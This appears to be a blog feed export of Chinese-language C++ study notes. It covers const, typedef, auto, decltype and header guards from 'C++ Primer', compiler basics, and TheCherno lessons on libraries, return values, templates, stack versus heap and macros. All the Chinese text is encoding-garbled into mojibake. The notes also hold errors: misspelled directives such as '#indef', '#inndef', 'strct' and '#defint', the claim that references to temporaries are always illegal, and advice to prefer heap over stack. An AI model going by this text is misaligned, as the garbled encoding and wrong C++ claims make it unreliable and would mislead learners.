id="constçš„å¼•ç”¨">constçš„å¼•ç”¨</h3><ul><li><strong>reference to const</strong>ï¼ˆå¯¹å¸¸é‡çš„å¼•ç”¨ï¼‰ï¼šæŒ‡å‘constå¯¹è±¡çš„å¼•ç”¨ï¼Œå¦‚ <code>const int ival=1; const int &amp;refVal = ival;</code>ï¼Œå¯ä»¥è¯»å–ä½†ä¸èƒ½ä¿®æ”¹<code>refVal</code>ã€‚</li><li><strong>ä¸´æ—¶é‡</strong>ï¼ˆtemporaryï¼‰å¯¹è±¡ï¼šå½“ç¼–è¯‘å™¨éœ€è¦ä¸€ä¸ªç©ºé—´æ¥æš‚å­˜è¡¨è¾¾å¼çš„æ±‚å€¼ç»“æœæ—¶ï¼Œä¸´æ—¶åˆ›å»ºçš„ä¸€ä¸ªæœªå‘½åçš„å¯¹è±¡ã€‚</li><li>å¯¹ä¸´æ—¶é‡çš„å¼•ç”¨æ˜¯éæ³•è¡Œä¸ºã€‚</li></ul><h3 id="æŒ‡é’ˆå’Œconst">æŒ‡é’ˆå’Œconst</h3><ul><li><strong>pointer to const</strong>ï¼ˆæŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆï¼‰ï¼šä¸èƒ½ç”¨äºæ”¹å˜å…¶æ‰€æŒ‡å¯¹è±¡çš„å€¼, å¦‚ <code>const double pi = 3.14; const double *cptr = &amp;pi;</code>ã€‚</li><li><strong>const pointer</strong>ï¼šæŒ‡é’ˆæœ¬èº«æ˜¯å¸¸é‡ï¼Œä¹Ÿå°±æ˜¯è¯´æŒ‡é’ˆå›ºå®šæŒ‡å‘è¯¥å¯¹è±¡ï¼Œï¼ˆå­˜æ”¾åœ¨æŒ‡é’ˆä¸­çš„åœ°å€ä¸å˜ï¼Œåœ°å€æ‰€å¯¹åº”çš„é‚£ä¸ªå¯¹è±¡å€¼å¯ä»¥ä¿®æ”¹ï¼‰å¦‚ <code>int i = 0; int *const ptr = &amp;i;</code></li></ul><h3 id="é¡¶å±‚const">é¡¶å±‚const</h3><ul><li><code>é¡¶å±‚const</code>ï¼šæŒ‡é’ˆæœ¬èº«æ˜¯ä¸ªå¸¸é‡ã€‚</li><li><code>åº•å±‚const</code>ï¼šæŒ‡é’ˆæŒ‡å‘çš„å¯¹è±¡æ˜¯ä¸ªå¸¸é‡ã€‚æ‹·è´æ—¶ä¸¥æ ¼è¦æ±‚ç›¸åŒçš„åº•å±‚constèµ„æ ¼ã€‚</li></ul><h3 id="constexprå’Œå¸¸é‡è¡¨è¾¾å¼ï¼ˆâ–²å¯é€‰ï¼‰"><code>constexpr</code>å’Œå¸¸é‡è¡¨è¾¾å¼ï¼ˆâ–²å¯é€‰ï¼‰</h3><ul><li>å¸¸é‡è¡¨è¾¾å¼ï¼šæŒ‡å€¼ä¸ä¼šæ”¹å˜ï¼Œä¸”åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å°±èƒ½å¾—åˆ°è®¡ç®—ç»“æœçš„è¡¨è¾¾å¼ã€‚</li><li><code>C++11</code>æ–°æ ‡å‡†è§„å®šï¼Œå…è®¸å°†å˜é‡å£°æ˜ä¸º<code>constexpr</code>ç±»å‹ä»¥ä¾¿ç”±ç¼–è¯‘å™¨æ¥éªŒè¯å˜é‡çš„å€¼æ˜¯å¦æ˜¯ä¸€ä¸ªå¸¸é‡çš„è¡¨è¾¾å¼ã€‚</li></ul><h2 id="å¤„ç†ç±»å‹">å¤„ç†ç±»å‹</h2><h3 id="ç±»å‹åˆ«å">ç±»å‹åˆ«å</h3><ul><li>ä¼ ç»Ÿåˆ«åï¼šä½¿ç”¨<strong>typedef</strong>æ¥å®šä¹‰ç±»å‹çš„åŒä¹‰è¯ã€‚ <code>typedef double wages;</code></li><li>æ–°æ ‡å‡†åˆ«åï¼šåˆ«åå£°æ˜ï¼ˆalias declarationï¼‰ï¼š <code>using SI = Sales_item;</code>ï¼ˆC++11ï¼‰</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¯¹äºå¤åˆç±»å‹ï¼ˆæŒ‡é’ˆç­‰ï¼‰ä¸èƒ½ä»£å›åŸå¼æ¥è¿›è¡Œç†è§£</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> *pstring;  <span class="comment">// pstringæ˜¯char*çš„åˆ«å</span></span><br><span class="line"><span class="type">const</span> pstring cstr = <span class="number">0</span>; <span class="comment">// æŒ‡å‘charçš„å¸¸é‡æŒ‡é’ˆ</span></span><br><span class="line"><span class="comment">// å¦‚æ”¹å†™ä¸ºconst char *cstr = 0;ä¸æ­£ç¡®ï¼Œä¸ºæŒ‡å‘const charçš„æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾…åŠ©ç†è§£ï¼ˆå¯ä»£å›ååŠ æ‹¬å·ï¼‰</span></span><br><span class="line"><span class="comment">// const pstring cstr = 0;ä»£å›åconst (char *) cstr = 0;</span></span><br><span class="line"><span class="comment">// const char *cstr = 0;å³ä¸º(const char *) cstr = 0;</span></span><br></pre></td></tr></table></figure><h3 id="autoç±»å‹è¯´æ˜ç¬¦-c-11">autoç±»å‹è¯´æ˜ç¬¦ c++11</h3><ul><li><strong>auto</strong>ç±»å‹è¯´æ˜ç¬¦ï¼šè®©ç¼–è¯‘å™¨<strong>è‡ªåŠ¨æ¨æ–­ç±»å‹</strong>ã€‚</li><li>ä¸€æ¡å£°æ˜è¯­å¥åªèƒ½æœ‰ä¸€ä¸ªæ•°æ®ç±»å‹ï¼Œæ‰€ä»¥ä¸€ä¸ªautoå£°æ˜å¤šä¸ªå˜é‡æ—¶åªèƒ½ç›¸åŒçš„å˜é‡ç±»å‹(åŒ…æ‹¬å¤æ‚ç±»å‹&amp;å’Œ*)ã€‚<code>auto sz = 0, pi =3.14//é”™è¯¯</code></li><li><code>int i = 0, &amp;r = i; auto a = r;</code> æ¨æ–­<code>a</code>çš„ç±»å‹æ˜¯<code>int</code>ã€‚</li><li>ä¼šå¿½ç•¥<code>é¡¶å±‚const</code>ã€‚</li><li><code>const int ci = 1; const auto f = ci;</code>æ¨æ–­ç±»å‹æ˜¯<code>int</code>ï¼Œå¦‚æœå¸Œæœ›æ˜¯é¡¶å±‚constéœ€è¦è‡ªå·±åŠ <code>const</code></li></ul><h3 id="decltypeç±»å‹æŒ‡ç¤ºç¬¦">decltypeç±»å‹æŒ‡ç¤ºç¬¦</h3><ul><li>ä»è¡¨è¾¾å¼çš„ç±»å‹æ¨æ–­å‡ºè¦å®šä¹‰çš„å˜é‡çš„ç±»å‹ã€‚</li><li><strong>decltype</strong>ï¼šé€‰æ‹©å¹¶è¿”å›æ“ä½œæ•°çš„<strong>æ•°æ®ç±»å‹</strong>ã€‚</li><li><code>decltype(f()) sum = x;</code> æ¨æ–­<code>sum</code>çš„ç±»å‹æ˜¯å‡½æ•°<code>f</code>çš„è¿”å›ç±»å‹ã€‚</li><li>ä¸ä¼šå¿½ç•¥<code>é¡¶å±‚const</code>ã€‚</li><li>å¦‚æœå¯¹å˜é‡åŠ æ‹¬å·ï¼Œç¼–è¯‘å™¨ä¼šå°†å…¶è®¤ä¸ºæ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå¦‚int iâ€“&gt;(i),åˆ™decltype((i))å¾—åˆ°ç»“æœä¸ºint&amp;å¼•ç”¨ã€‚</li><li>èµ‹å€¼æ˜¯ä¼šäº§ç”Ÿå¼•ç”¨çš„ä¸€ç±»å…¸å‹è¡¨è¾¾å¼ï¼Œå¼•ç”¨çš„ç±»å‹å°±æ˜¯å·¦å€¼çš„ç±»å‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœ i æ˜¯ intï¼Œåˆ™è¡¨è¾¾å¼ i=x çš„ç±»å‹æ˜¯ int&amp;ã€‚</li><li><code>C++11</code></li></ul><h2 id="è‡ªå®šä¹‰æ•°æ®ç»“æ„">è‡ªå®šä¹‰æ•°æ®ç»“æ„</h2><h3 id="struct">struct</h3><blockquote><p>å°½é‡ä¸è¦å§ç±»å®šä¹‰å’Œå¯¹è±¡å®šä¹‰æ”¾åœ¨ä¸€èµ·ã€‚å¦‚<code>struct Student&#123;&#125; xiaoming,xiaofang;</code></p></blockquote><ul><li>ç±»å¯ä»¥ä»¥å…³é”®å­—<code>struct</code>å¼€å§‹ï¼Œç´§è·Ÿç±»åå’Œç±»ä½“ã€‚</li><li>ç±»æ•°æ®æˆå‘˜ï¼šç±»ä½“å®šä¹‰ç±»çš„æˆå‘˜ã€‚</li><li><code>C++11</code>ï¼šå¯ä»¥ä¸ºç±»æ•°æ®æˆå‘˜æä¾›ä¸€ä¸ª<strong>ç±»å†…åˆå§‹å€¼</strong>ï¼ˆin-class initializerï¼‰ã€‚</li></ul><h3 id="ç¼–å†™è‡ªå·±çš„å¤´æ–‡ä»¶">ç¼–å†™è‡ªå·±çš„å¤´æ–‡ä»¶</h3><ul><li>å¤´æ–‡ä»¶é€šå¸¸åŒ…å«å“ªäº›åªèƒ½è¢«å®šä¹‰ä¸€æ¬¡çš„å®ä½“ï¼šç±»ã€<code>const</code>å’Œ<code>constexpr</code>å˜é‡ã€‚</li></ul><p>é¢„å¤„ç†å™¨æ¦‚è¿°ï¼š</p><ul><li><strong>é¢„å¤„ç†å™¨</strong>ï¼ˆpreprocessorï¼‰ï¼šç¡®ä¿å¤´æ–‡ä»¶å¤šæ¬¡åŒ…å«ä»èƒ½å®‰å…¨å·¥ä½œã€‚</li><li>å½“é¢„å¤„ç†å™¨çœ‹åˆ°<code>#include</code>æ ‡è®°æ—¶ï¼Œä¼šç”¨æŒ‡å®šçš„å¤´æ–‡ä»¶å†…å®¹ä»£æ›¿<code>#include</code></li><li><strong>å¤´æ–‡ä»¶ä¿æŠ¤ç¬¦</strong>ï¼ˆheader guardï¼‰ï¼šå¤´æ–‡ä»¶ä¿æŠ¤ç¬¦ä¾èµ–äºé¢„å¤„ç†å˜é‡çš„çŠ¶æ€ï¼šå·²å®šä¹‰å’Œæœªå®šä¹‰ã€‚<ul><li><code>#indef</code>å·²å®šä¹‰æ—¶ä¸ºçœŸ</li><li><code>#inndef</code>æœªå®šä¹‰æ—¶ä¸ºçœŸ</li><li>å¤´æ–‡ä»¶ä¿æŠ¤ç¬¦çš„åç§°éœ€è¦å”¯ä¸€ï¼Œä¸”ä¿æŒå…¨éƒ¨å¤§å†™ã€‚å…»æˆè‰¯å¥½ä¹ æƒ¯ï¼Œä¸è®ºæ˜¯å¦è¯¥å¤´æ–‡ä»¶è¢«åŒ…å«ï¼Œè¦åŠ ä¿æŠ¤ç¬¦ã€‚</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SALES_DATA_H  <span class="comment">//SALES_DATA_Hæœªå®šä¹‰æ—¶ä¸ºçœŸ</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SALES_DATA_H</span></span><br><span class="line">strct Sale_data&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> ã€ŠC++ Primer 5thã€‹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬1ç«  å¼€å§‹</title>
      <link href="/2023/05/01/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch01/"/>
      <url>/2023/05/01/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch01/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬1ç« -å¼€å§‹">ç¬¬1ç«  å¼€å§‹</h1><h2 id="ç†Ÿæ‚‰ç¼–è¯‘å™¨">ç†Ÿæ‚‰ç¼–è¯‘å™¨</h2><p><strong>g++</strong>ï¼š</p><ul><li>ç¼–è¯‘ï¼š<code>g++ --std=c++11 ch01.cpp -o main</code></li><li>è¿è¡Œï¼š<code>./prog1</code></li><li>æŸ¥çœ‹è¿è¡ŒçŠ¶æ€ï¼š<code>echo $?</code></li><li><strong>ç¼–è¯‘å¤šä¸ªæ–‡ä»¶</strong>:<code>g++ ch2.cpp Sales_item.cc -o main</code></li></ul><p>è¾“å…¥ <code>g++ --help</code>ï¼ŒæŸ¥çœ‹ç¼–è¯‘å™¨é€‰é¡¹ï¼Œéƒ¨åˆ†å¸¸è§é€‰é¡¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-E                       Preprocess only; do not compile, assemble or link</span><br><span class="line">-S                       Compile only; do not assemble or link</span><br><span class="line">-c                       Compile and assemble, but do not link</span><br><span class="line">-o &lt;file&gt;                Place the output into &lt;file&gt;</span><br><span class="line">-pie                     Create a position independent executable</span><br><span class="line">-shared                  Create a shared library</span><br></pre></td></tr></table></figure><p><strong>è·å¾—ç¨‹åºçŠ¶æ€</strong>:</p><ul><li>windows: <code>echo %ERRORLEVEL%</code></li><li>UNIX: <code>echo $?</code></li></ul><h2 id="IO">IO</h2><ul><li><code>#include &lt;iostream&gt;</code></li><li><code>std::cout &lt;&lt; &quot;hello&quot;</code></li><li><code>std::cin &gt;&gt; v1</code></li></ul><p>è®°ä½<code>&gt;&gt;</code>å’Œ<code>&lt;&lt;</code>è¿”å›çš„ç»“æœéƒ½æ˜¯å·¦æ“ä½œæ•°ï¼Œä¹Ÿå°±æ˜¯è¾“å…¥æµå’Œè¾“å‡ºæµæœ¬èº«ã€‚</p><p><strong>endl</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªè¢«ç§°ä¸º<strong>æ“çºµç¬¦</strong>ï¼ˆmanipulatorï¼‰çš„ç‰¹æ®Šå€¼ï¼Œæ•ˆæœæ˜¯<strong>ç»“æŸå½“å‰è¡Œï¼Œå¹¶å°†è®¾å¤‡å…³è”çš„ç¼“å†²åŒºï¼ˆbufferï¼‰ä¸­çš„å†…å®¹åˆ·åˆ°è®¾å¤‡ä¸­</strong>ã€‚</p><p>UNIXå’ŒMacä¸‹é”®ç›˜è¾“å…¥æ–‡ä»¶ç»“æŸç¬¦ï¼š<code>ctrl+d</code>ï¼ŒWindowsä¸‹ï¼š<code>ctrl+z</code></p><p><strong>å¤´æ–‡ä»¶</strong>ï¼šç±»çš„ç±»å‹ä¸€èˆ¬å­˜å‚¨åœ¨å¤´æ–‡ä»¶ä¸­ï¼Œæ ‡å‡†åº“çš„å¤´æ–‡ä»¶ä½¿ç”¨<code>&lt;&gt;</code>ï¼Œéæ ‡å‡†åº“çš„å¤´æ–‡ä»¶ä½¿ç”¨<code>&quot;&quot;</code>ã€‚ç”³æ˜å†™åœ¨<code>.h</code>æ–‡ä»¶ï¼Œå®šä¹‰å®ç°<strong>å†™</strong>åœ¨<code>.cpp</code>æ–‡ä»¶ã€‚</p><p><strong>é¿å…å¤šæ¬¡åŒ…å«åŒä¸€å¤´æ–‡ä»¶</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SALESITEM_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SALESITEM_H</span></span><br><span class="line"><span class="comment">// Definition of Sales_itemclass and related functions goes here</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><strong>æˆå‘˜å‡½æ•°ï¼ˆç±»æ–¹æ³•ï¼‰</strong>ï¼šä½¿ç”¨<code>.</code>è°ƒç”¨ã€‚</p><p><strong>å‘½åç©ºé—´ï¼ˆnamespaceï¼‰</strong>ï¼šä½¿ç”¨ä½œç”¨åŸŸè¿ç®—ç¬¦<code>::</code>è°ƒç”¨ã€‚</p><h2 id="æ³¨é‡Š">æ³¨é‡Š</h2><ul><li>å•è¡Œæ³¨é‡Šï¼š <code>//</code></li><li>å¤šè¡Œæ³¨é‡Šï¼š <code>/**/</code>ã€‚ç¼–è¯‘å™¨å°†<code>/*</code>å’Œ<code>*/</code>ä¹‹é—´çš„å†…å®¹éƒ½ä½œä¸ºæ³¨é‡Šå†…å®¹å¿½ç•¥ã€‚<strong>æ³¨æ„ä¸èƒ½åµŒå¥—</strong>ã€‚</li></ul><h2 id="ä½¿ç”¨æ–‡ä»¶é‡å®šå‘">ä½¿ç”¨æ–‡ä»¶é‡å®šå‘</h2><p><code>./main &lt;infile &gt;outfile</code></p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> ã€ŠC++ Primer 5thã€‹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Chernoç¬”è®°(51-70)</title>
      <link href="/2023/04/15/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-51-70/"/>
      <url>/2023/04/15/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-51-70/</url>
      
        <content type="html"><![CDATA[<p>è¯¾ç¨‹åœ°å€ï¼š<a href="https://www.youtube.com/watch?v=18c3MTX0PK0&amp;list=PLlrATfBNZ98dudnM48yfGUldqGD0S4FFb&amp;index=1">Youtubeä¸ŠTheChernoä¸Šä¼ çš„è§†é¢‘</a><br>ç¿»è¯‘ï¼š<a href="https://www.bilibili.com/video/BV1uy4y167h2/?spm_id_from=333.788&amp;vd_source=0d3fa48307c38b76dfdfa60ed4b44b42">ç¥ç»å…ƒçŒ«çš„é«˜è´¨é‡ç¿»è¯‘</a></p><h1 id="51-Making-and-Working-with-Libraries-in-C-Multiple-Projects-in-Visual-Studio">51 Making and Working with Libraries in C++ (Multiple Projects in Visual Studio)</h1><p>è®²å¦‚ä½•åœ¨vsä¸­å»ºç«‹å¤šä¸ªé¡¹ç›®ï¼Œä»¥åŠå¦‚ä½•åˆ›å»ºä¸€ä¸ªåº“è®©æ‰€æœ‰é¡¹ç›®éƒ½èƒ½ç”¨ã€‚</p><ol><li>ç¡®ä¿ç›®æ ‡projectçš„é…ç½®ç±»å‹ä¸ºé™æ€ç±».(lib)ã€‚</li><li>è®¾ç½®â€œé™„ä»¶åŒ…å«ç›®å½•â€ä»¥ä¾¿èƒ½åœ¨includeæ—¶èƒ½æ­£ç¡®å¯»æ‰¾åˆ°ç›®æ ‡æ–‡ä»¶ã€‚</li><li>æ·»åŠ å¼•ç”¨ï¼Œè¿™ä¼šå¸®æˆ‘ä»¬è‡ªåŠ¨è®¾ç½®è¿æ¥å™¨è¾“å…¥ï¼Œå¹¶ä¸”æ”¹åæ—¶ä¸å—å½±å“ï¼Œè¿˜ä¼šè‡ªåŠ¨åˆ›å»ºå®Œæ•´çš„ä¾èµ–å…³ç³»å›¾ï¼Œå…ˆç¼–è¯‘ä¾èµ–åç¼–è¯‘æ­¤æ–‡ä»¶ã€‚</li></ol><p>ç”±äºæ˜¯é™æ€é“¾æ¥ï¼Œç§»åŠ¨åä»ç„¶å¯ç”¨ï¼Œè‹¥ä¸ºåŠ¨æ€é“¾æ¥åˆ™å¿…é¡»å’Œdllæ–‡ä»¶åœ¨åŒä¸€ç›®å½•ä¸‹ã€‚</p><h1 id="52-How-to-Deal-with-Multiple-Return-Values-in-C">52 How to Deal with Multiple Return Values in C++</h1><h2 id="æ³•1-è¿”å›struct">æ³•1 è¿”å›struct</h2><h2 id="æ³•2-ä¼ å…¥å­˜ç»“æœçš„æŒ‡é’ˆï¼Œæ²¡æœ‰åŠ¨æ€åˆ†é…">æ³•2 ä¼ å…¥å­˜ç»“æœçš„æŒ‡é’ˆï¼Œæ²¡æœ‰åŠ¨æ€åˆ†é…</h2><p>ä»æŠ€æœ¯ä¸Šæ¥è¯´å¯èƒ½æ˜¯æœ€ç†æƒ³çš„æ–¹æ³•ï¼Œå› ä¸ºæ²¡æœ‰å¤åˆ¶ã€‚</p><h2 id="æ³•3-è¿”å›æ•°ç»„â€”â€”åªæœ‰ç±»å‹ç›¸åŒæ—¶æ‰é€‚ç”¨">æ³•3 è¿”å›æ•°ç»„â€”â€”åªæœ‰ç±»å‹ç›¸åŒæ—¶æ‰é€‚ç”¨</h2><p>å£°æ˜ï¼š<code>static std::string* ParseShader(const std::string&amp; filepath);</code> æˆ– <code>static std::array&lt;std::string, 2&gt; ParseShader(const std::string&amp; filepath);</code> æ”¹ç”¨vectorä¹Ÿè¡Œ</p><p>è¿”å›ï¼š<code>return new std::string[]&#123;vs, fs&#125;;</code>æˆ–<code>return std::array&lt;std::string, 2&gt;(vs, fs);</code> newä¼šå¯¼è‡´å †åˆ†é…çš„å‘ç”Ÿï¼ŒåŒæ—¶åªé€‚åˆè¿”å›å•ä¸€ç±»å‹ã€‚</p><p>arrayä¼šåœ¨æ ˆä¸Šåˆ›å»ºï¼Œè€Œvectoråº•å±‚å­˜å‚¨æ˜¯åœ¨å †ä¸Šã€‚</p><h2 id="æ³•4-è¿”å›tupleæˆ–pairï¼Œå®¹æ˜“ææ··">æ³•4 è¿”å›tupleæˆ–pairï¼Œå®¹æ˜“ææ··</h2><p>#include <tuple><br>#include <utility> (make_tuple)<br>static std::tupleæˆ–è€…pair&lt;è¿”å›ç±»å‹1ï¼Œè¿”å›ç±»å‹2&gt; func( , )<br>return make_pair(è¿”å›å€¼1ï¼Œè¿”å›å€¼2)</utility></tuple></p><p>ä»tuple ä¸­è·å¾—å€¼<br>source=è¿”å›çš„å…ƒç»„(tuple or like pair)<br>std::get&lt;0/1/2/3&gt;(tupleåsource);<br>pair çš„ç±»å‹ï¼Œå¯ä»¥ç”¨ source.first</p><h1 id="53-Templates-in-C">53 Templates in C++</h1><p>templateä¸â€œæ³›å‹â€ä¸åŒï¼Œä¹Ÿä¸èƒ½è¯´å®Œå…¨ä¸åŒï¼Œæ¯”æ³›å‹ç‰›é€¼çš„å¤šï¼ˆæ³›å‹éå¸¸å—é™äºç±»å‹ç³»ç»Ÿï¼‰ã€‚templateæœ‰ç‚¹åƒå®ã€‚</p><p>templateå…è®¸å®šä¹‰ä¸€ä¸ªå¯æ ¹æ®ç”¨é€”è¿›è¡Œç¼–è¯‘çš„æ¨¡æ¿ï¼ˆè®©ç¼–è¯‘å™¨åŸºäºä¸€å¥—è§„åˆ™ï¼Œä¸ºä½ å†™ä»£ç ï¼‰ã€‚</p><p><strong>æ¨¡æ¿ä¸æ˜¯å®é™…å­˜åœ¨çš„å‡½æ•°</strong>ï¼ˆMSVCä¸­æœ‰é”™è¯¯å¯èƒ½ä¹Ÿèƒ½è¿‡ç¼–è¯‘ï¼Œvs2022ä¸èƒ½è¿‡ï¼‰ï¼Œåªæœ‰å½“è°ƒç”¨æ—¶æ‰ä¼šè¢«å®é™…åˆ›å»ºã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;  <span class="comment">// ç”¨classæˆ–typenameå‡å¯ï¼Œè¿™é‡Œclasså’Œç±»ç±»å‹ä¸æ˜¯ä¸€ä¸ª</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">(T value)</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; value &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Print</span>(<span class="number">5</span>);</span><br><span class="line">  <span class="built_in">Print</span>&lt;<span class="type">int</span>&gt;(<span class="number">6</span>);</span><br><span class="line">  <span class="built_in">Print</span>(<span class="number">5.5f</span>);</span><br><span class="line">  <span class="built_in">Print</span>(<span class="string">&quot;JKA&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¨¡æ¿ç»ä¸ä»…é™äºç±»å‹æˆ–åˆ™ä»»ä½•ä¸œè¥¿ï¼Œä¹Ÿä¸é™äºå‡½æ•°ï¼Œå¯åˆ›å»ºä¸€æ•´ä¸ªç±»ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T, <span class="type">int</span> N&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Array</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  T m_Array[N];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">GetSize</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> N;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Array&lt;std::string, <span class="number">5</span>&gt; array;</span><br><span class="line">  std::cout &lt;&lt; array.<span class="built_in">GetSize</span>() &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="54-Stack-vs-Heap-Memory-in-C">54 Stack vs Heap Memory in C++</h1><p>å †å†…å­˜å’Œæ ˆå†…å­˜çš„ <strong>å†…å­˜åˆ†é…</strong> æ–¹å¼ä¸åŒã€‚<br>æ ˆåˆ†é…éå¸¸å¿«ï¼Œæ‰€åšçš„å°±æ˜¯ç§»åŠ¨æ ˆæŒ‡é’ˆï¼Œå°±åƒä¸€æ¡CPUæŒ‡ä»¤ã€‚æ ˆå¤§å°æ¯”å¦‚2Mã€‚<br>å †å†…å­˜åˆ†é…æ˜¯ä¸€å †äº‹æƒ…ï¼Œç¨‹åºç»´æŠ¤ç©ºé—²åˆ—è¡¨ï¼Œå¦‚æœéœ€è¦å†…å­˜è¿‡å¤§è¿˜ä¼šå‘OSç”³è¯·å†…å­˜ï¼Œè¿™éå¸¸è€—è´¹èµ„æºã€‚<br>ä½¿ç”¨ä¸Šï¼Œå°½é‡ä½¿ç”¨å †ï¼Œé™¤é<strong>éœ€è¦å˜é‡ç”Ÿå­˜æœŸ</strong>å¤§äºä½œç”¨åŸŸï¼Œæˆ–éœ€è¦<strong>å¾ˆå¤§çš„å†…å­˜</strong>ã€‚</p><p>å¯¹äº struct Vector3 {float x, y, z;} å †åˆ†é…ä½¿ç”¨<code>Vector3* hvector = new Vector3();</code> æˆ–<code>Vector3* hvector = new Vector3;</code> éƒ½æ˜¯å¯ä»¥çš„</p><h1 id="55-Macros-in-C">55 Macros in C++</h1><p>å®æ˜¯ä¸€ä¸ªå¾ˆå®½æ³›çš„æ¦‚å¿µï¼Œè¿™é‡ŒæŒ‡C++ä¸­ä½¿ç”¨é¢„å¤„ç†å™¨æ¥â€œå®â€åŒ–æŸäº›æ“ä½œã€‚<br>é¢„å¤„ç†å™¨å¤„ç†å®å‘ç”Ÿåœ¨é¢„ç¼–è¯‘æœŸï¼Œæ‰€åšçš„å°±æ˜¯æŸ¥æ‰¾å’Œæ›¿æ¢â€”â€”æ‰€ä»¥ä¸è¦åŠ åˆ†å·</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#defint LOG(x) std::cout &lt;&lt; x &lt;&lt; std::endl</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">LOG</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–ç¨‹ä¹ æƒ¯ï¼šä¸è¦å‘äººç‚«è€€ä½ 